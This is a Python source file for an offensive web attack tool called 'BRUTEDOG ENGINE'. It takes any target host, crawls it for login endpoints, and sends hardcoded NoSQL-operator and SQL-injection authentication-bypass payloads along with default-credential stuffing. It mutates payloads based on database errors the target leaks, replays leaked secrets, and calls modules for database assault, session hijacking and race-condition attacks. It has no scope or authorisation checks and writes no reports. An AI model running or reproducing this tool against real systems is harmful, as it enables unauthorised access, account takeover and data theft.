#!/usr/bin/env python3
"""
BRUTEDOG ENGINE v6.1 — High-Aggression Stateful Crawling & Exploitation Engine
Features:
- Stateful intelligence ingestion from v6.1 crawler (endpoints, session cookies, leaked OTPs)
- Live autonomous test-account session propagation across exploit modules
- Interactive target selection & automated resolution
- Stateful, adaptive response-parsing and payload mutation loop
- Aggressive NoSQL/SQL time-based blind injection & data extraction
- Advanced session hijacking, JWT cracking, and cookie privilege escalation
- High-concurrency race condition and balance/state logic fuzzing
- Session-cookie security inspection
- Bounded concurrency with asyncio
- Live terminal streaming of successful exploits
- No report files, in-memory findings
"""
import asyncio
import http.client
import json
import re
import socket
import ssl
import sys
import time
from urllib.parse import urlsplit
from concurrent.futures import ThreadPoolExecutor

# Import weaponized offensive modules
from modules.crawler import crawl_target
from modules.db_assault import run_nosql_assault
from modules.session_hijack import run_session_hijack
from modules.race_condition import run_race_condition_test

# ============================================================
# CONFIGURATION
# ============================================================
REQUEST_TIMEOUT = 8
MAX_WORKERS = 5
MAX_RESPONSE_SIZE = 200_000
USER_AGENT = "BruteDog-Offensive-Engine/6.1"

FALLBACK_LOGIN_PATHS = [
    "/api/auth/callback/credentials",
    "/api/auth/login",
    "/api/auth/signin",
    "/api/v1/auth/login",
    "/api/v1/users/login",
    "/api/login",
    "/api/signin",
    "/api/session",
    "/login",
    "/signin",
    "/auth/login",
    "/auth",
    "/user/login",
    "/admin/login",
    "/api/admin/login",
]

ERROR_PATTERNS = {
    "SQL syntax": re.compile(
        r"sql syntax|mysql_|pg_query|sqlite3\.|ora-009|syntax error",
        re.I,
    ),
    "MongoDB error": re.compile(
        r"mongodb|mongosh|mongoerror|bsonerror|casttoobjectid",
        re.I,
    ),
    "Database exception": re.compile(
        r"database exception|query failed|"
        r"invalid query|database error|unhandled exception",
        re.I,
    ),
}

# ============================================================
# OUTPUT
# ============================================================
def info(message):
    sys.stdout.write(f"\033[96m[*] {message}\033[0m\n")
    sys.stdout.flush()

def success(message):
    sys.stdout.write(f"\033[92m[+] {message}\033[0m\n")
    sys.stdout.flush()

def warning(message):
    sys.stdout.write(f"\033[93m[!] {message}\033[0m\n")
    sys.stdout.flush()

def error(message):
    sys.stdout.write(f"\033[91m[-] {message}\033[0m\n")
    sys.stdout.flush()

def section(title):
    sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
    sys.stdout.flush()

# ============================================================
# TARGET HANDLING
# ============================================================
def get_target():
    section("BRUTEDOG TARGET CONFIGURATION")
    print("Enter a domain, IP address, or server URL.")
    target = input("\nTarget: ").strip()
    if not target:
        raise ValueError("Target cannot be empty.")
    if "://" not in target:
        target = "https://" + target
    parsed = urlsplit(target)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Unsupported protocol.")
    if not parsed.hostname:
        raise ValueError("Invalid hostname.")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    return parsed.hostname, port, parsed.scheme == "https", parsed.path.rstrip("/")

def resolve_target(host):
    try:
        results = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
        return sorted({item[4][0] for item in results})
    except socket.gaierror:
        return []

# ============================================================
# HTTP TRANSPORT
# ============================================================
def request(host, port, path, payload, secure, cookies=None):
    conn = None
    started = time.monotonic()
    try:
        if secure:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=REQUEST_TIMEOUT, context=context)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=REQUEST_TIMEOUT)
            
        body = json.dumps(payload).encode("utf-8")
        headers = {
            "User-Agent": USER_AGENT,
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Connection": "close",
        }
        if cookies:
            headers["Cookie"] = cookies

        conn.request("POST", path, body=body, headers=headers)
        response = conn.getresponse()
        response_body = response.read(MAX_RESPONSE_SIZE).decode("utf-8", errors="replace")
        response_headers = {key.lower(): value for key, value in response.getheaders()}
        return {
            "status": response.status,
            "headers": response_headers,
            "body": response_body,
            "elapsed": round(time.monotonic() - started, 3),
            "error": None,
        }
    except Exception as exc:
        return {
            "status": 0,
            "headers": {},
            "body": "",
            "elapsed": 0,
            "error": str(exc),
        }
    finally:
        if conn:
            conn.close()

# ============================================================
# ADAPTIVE RESPONSE ANALYSIS & MUTATION ENGINE
# ============================================================
def detect_database_errors(body):
    findings = []
    for label, pattern in ERROR_PATTERNS.items():
        if pattern.search(body or ""):
            findings.append(label)
    return findings

def inspect_cookie_security(headers):
    cookie = headers.get("set-cookie", "")
    if not cookie:
        return []
    issues = []
    lower = cookie.lower()
    if "secure" not in lower:
        issues.append("Secure attribute missing")
    if "httponly" not in lower:
        issues.append("HttpOnly attribute missing")
    if "samesite" not in lower:
        issues.append("SameSite attribute missing")
    return issues

def classify_and_adapt(response, current_payload):
    status = response["status"]
    body = response["body"]
    findings = []
    mutated_payloads = []
    
    if status in [200, 201, 302] and any(k in body.lower() for k in ["token", "success", "session", "welcome", "auth", "jwt"]):
        sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE AUTHENTICATION BYPASS / CREDENTIAL HIT [***]\033[0m\n")
        sys.stdout.write(f"  ├── Payload : {json.dumps(current_payload)}\n")
        sys.stdout.write(f"  └── Response: \033[92m{body[:250]}\033[0m\n")
        sys.stdout.flush()
        findings.append({
            "type": "AUTHENTICATION_BYPASS_SUCCESS",
            "evidence": f"Status {status} with valid session/token indicator",
            "status": status,
        })

    db_errors = detect_database_errors(body)
    for db_error in db_errors:
        sys.stdout.write(f"\033[93m[!] Adaptive Trigger: Server leaked database error ({db_error}). Mutating payload...\033[0m\n")
        sys.stdout.flush()
        findings.append({
            "type": "POTENTIAL_DATABASE_INJECTION",
            "evidence": db_error,
            "status": status,
        })
        if "MongoDB" in db_error:
            mutated_payloads.append({"username": {"$regex": "^admin.*$"}, "password": {"$ne": ""}})
        elif "SQL" in db_error:
            mutated_payloads.append({"username": "admin' UNION SELECT null, version()-- -", "password": "password"})

    for issue in inspect_cookie_security(response["headers"]):
        findings.append({
            "type": "SESSION_COOKIE_CONFIGURATION",
            "evidence": issue,
            "status": status,
        })
        
    return findings, mutated_payloads

# ============================================================
# ACTIVE ADAPTIVE ENDPOINT TESTING
# ============================================================
def test_endpoint(host, port, base_path, path, secure, session_cookie=None, credentials_list=None, leaked_secrets=None):
    endpoint = f"{base_path}{path}" if not path.startswith(base_path) else path
    info(f"Targeting endpoint (Stateful Adaptive Mode): {endpoint}")
    results = []
    
    test_queue = [
        {"name": "NoSQL Operator Probe", "payload": {"username": {"$ne": None}, "password": {"$ne": None}}},
        {"name": "SQLi Union Probe", "payload": {"username": "admin' OR '1'='1", "password": "password"}},
        {"name": "Admin Default Stuffing", "payload": {"username": "admin", "password": "password123"}},
        {"name": "Malformed Type Probe", "payload": {"username": {"unexpected": "object"}, "password": "password"}}
    ]

    # If the crawler leaked an OTP or verification code, inject a test case for it
    if leaked_secrets:
        for k, v in leaked_secrets.items():
            test_queue.insert(0, {"name": f"Leaked Secret Replay ({k})", "payload": {k: v, "code": v}})

    if credentials_list and isinstance(credentials_list, list):
        for cred in credentials_list:
            if isinstance(cred, dict):
                test_queue.insert(0, {"name": "User Credential Stuffing", "payload": cred})

    executed_payloads = set()

    while test_queue:
        current_test = test_queue.pop(0)
        payload_key = json.dumps(current_test["payload"], sort_keys=True)
        if payload_key in executed_payloads:
            continue
        executed_payloads.add(payload_key)

        result = request(host, port, endpoint, current_test["payload"], secure, cookies=session_cookie)
        if result["error"]:
            continue
            
        findings, dynamic_mutations = classify_and_adapt(result, current_test["payload"])
        
        results.append({
            "endpoint": endpoint,
            "test": current_test["name"],
            "status": result["status"],
            "elapsed": result["elapsed"],
            "findings": findings,
        })

        for idx, mutant in enumerate(dynamic_mutations, 1):
            test_queue.insert(0, {
                "name": f"Adaptive Mutant #{idx}",
                "payload": mutant
            })
        
    return results

# ============================================================
# ENGINE ORCHESTRATOR
# ============================================================
async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
    section("BRUTEDOG STATEFUL OFFENSIVE EXPLOITATION ENGINE v6.1")
    try:
        if target_host:
            target = target_host.strip()
            if "://" not in target:
                target = "https://" + target
            parsed = urlsplit(target)
            if not parsed.hostname:
                raise ValueError("Invalid target.")
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            secure = parsed.scheme == "https"
            base_path = parsed.path.rstrip("/")
        else:
            host, port, secure, base_path = get_target()
    except Exception as exc:
        error(f"Target configuration failed: {exc}")
        return [], 0.0

    protocol = "HTTPS" if secure else "HTTP"
    info(f"Target Host : {host}")
    info(f"Target Port : {port}")
    info(f"Protocol    : {protocol}")
    
    section("DNS RESOLUTION")
    addresses = resolve_target(host)
    if not addresses:
        error("DNS resolution failed.")
        return [], 0.0
    for address in addresses:
        success(f"Resolved: {address}")
        
    start = time.monotonic()
    target_url = f"{protocol.lower()}://{host}:{port}{base_path}"
    
    # 0. Stateful Dynamic Web Crawling & Auto-Provisioning
    section("STATEFUL CRAWLING & OPERATOR PROVISIONING")
    session_cookie = ""
    operator_creds = {}
    leaked_secrets = {}
    discovered_paths = []

    try:
        recon_data = crawl_target(target_url)
        if isinstance(recon_data, dict):
            discovered_paths = recon_data.get("endpoints", [])
            session_cookie = recon_data.get("session_cookie", "")
            operator_creds = recon_data.get("operator_credentials", {})
            leaked_secrets = recon_data.get("leaked_secrets", {})
        elif isinstance(recon_data, list):
            discovered_paths = recon_data
    except Exception as exc:
        warning(f"Stateful crawler encountered an issue: {exc}. Falling back to default list.")

    if not discovered_paths:
        discovered_paths = FALLBACK_LOGIN_PATHS

    if session_cookie:
        success(f"Propagating active operator session cookie into exploit modules.")
    if leaked_secrets:
        warning(f"Discovered potential leaked JSON codes/tokens: {leaked_secrets}")

    section("ADAPTIVE ENDPOINT TESTING & MUTATION ASSAULT")
    all_results = []
    semaphore = asyncio.Semaphore(MAX_WORKERS)
    
    async def worker(path):
        async with semaphore:
            return await asyncio.to_thread(
                test_endpoint, host, port, base_path, path, secure, session_cookie, credentials_list, leaked_secrets
            )
            
    tasks = [asyncio.create_task(worker(path)) for path in discovered_paths]
    
    for completed in asyncio.as_completed(tasks):
        try:
            results = await completed
            if results:
                all_results.extend(results)
        except Exception as exc:
            error(f"Endpoint worker failed: {exc}")

    # 1. Aggressive Database Assault
    try:
        await run_nosql_assault(target_url, port=port, use_ssl=secure)
    except Exception as exc:
        error(f"Database assault failed: {exc}")

    # 2. Session Hijacking & Token Forging
    try:
        await run_session_hijack(target_url, port=port, use_ssl=secure)
    except Exception as exc:
        error(f"Session hijack failed: {exc}")

    # 3. High-Concurrency Race Condition & Logic Fuzzing
    try:
        await run_race_condition_test(target_url, port=port, use_ssl=secure)
    except Exception as exc:
        error(f"Race condition module failed: {exc}")
            
    duration = round(time.monotonic() - start, 2)
    
    section("ENGINE SUMMARY")
    tested = len(all_results)
    potential = sum(len(item["findings"]) for item in all_results)
    success(f"Target: {host}")
    success(f"Discovered/Scanned endpoints: {len(discovered_paths)}")
    success(f"Total adaptive requests executed: {tested}")
    success(f"Vulnerability / Exploitation hits: {potential}")
    success(f"Engine duration: {duration}s")
    section("ENGINE COMPLETE")
    return all_results, duration

if __name__ == "__main__":
    try:
        asyncio.run(run_autonomous_engine())
    except KeyboardInterrupt:
        warning("Engine interrupted by operator.")
    except Exception as exc:
        error(f"Engine failure: {exc}")

